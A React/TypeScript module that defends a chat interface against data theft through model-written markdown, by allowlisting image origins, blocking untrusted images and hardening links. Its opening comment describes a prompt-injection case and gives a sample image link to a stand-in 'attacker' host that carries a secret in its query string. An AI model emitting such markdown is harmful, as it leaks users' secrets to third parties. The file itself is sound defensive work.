import React from "react";
import { defaultUrlTransform, type Components } from "react-markdown";

// Model-authored markdown is untrusted: a prompt-injected reply can embed
// ![x](https://attacker/?d=<secret>) and the browser GETs it on paint — a
// zero-click exfiltration channel. Every ReactMarkdown that renders model text
// MUST pass BOTH safeUrlTransform (blocks the fetch) and safeMarkdownComponents
// (renders blocked images as inert placeholders, hardens links). The document
// CSP (vite.config.ts) is the backstop; this is the precise layer.

const SUPABASE_ORIGIN = "https://ktzaysdkdkocqhewwtnn.supabase.co";

/** Origins model markdown may load fetched-on-paint resources (images) from. */
export const TRUSTED_MEDIA_ORIGINS: readonly string[] = [SUPABASE_ORIGIN];

function parsed(url: string): URL | null {
  try {
    return new URL(url, typeof window !== "undefined" ? window.location.href : SUPABASE_ORIGIN);
  } catch {
    return null;
  }
}

export function isTrustedMediaUrl(url: string): boolean {
  const u = parsed(url);
  if (!u) return false;
  // data:/blob: carry their payload — nothing is fetched from a third party.
  if (u.protocol === "data:" || u.protocol === "blob:") return true;
  if (typeof window !== "undefined" && u.origin === window.location.origin) return true;
  return TRUSTED_MEDIA_ORIGINS.includes(u.origin);
}

/**
 * react-markdown urlTransform. `key` is the attribute the URL lands in:
 * "src" (auto-fetched on paint → host allowlist) vs "href" (needs a user
 * click → scheme sanitization only, which defaultUrlTransform provides).
 */
export function safeUrlTransform(url: string, key: string): string {
  const std = defaultUrlTransform(url);
  if (!std) return "";
  if (key === "src") return isTrustedMediaUrl(std) ? std : "";
  return std;
}

export const safeMarkdownComponents: Components = {
  img: ({ src, alt, title }) => {
    if (!src || !isTrustedMediaUrl(String(src))) {
      return (
        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded bg-surface-container-high/60 border border-outline-variant/20 text-xs text-on-surface-variant align-middle">
          <span className="material-symbols-outlined text-sm leading-none">hide_image</span>
          external image blocked{alt ? `: ${String(alt).slice(0, 60)}` : ""}
        </span>
      );
    }
    return <img src={String(src)} alt={alt || ""} title={title || undefined} loading="lazy" className="max-w-full rounded-lg" />;
  },
  a: ({ href, children, title }) => (
    <a href={href} title={title || undefined} target="_blank" rel="noopener noreferrer nofollow">
      {children}
    </a>
  ),
};
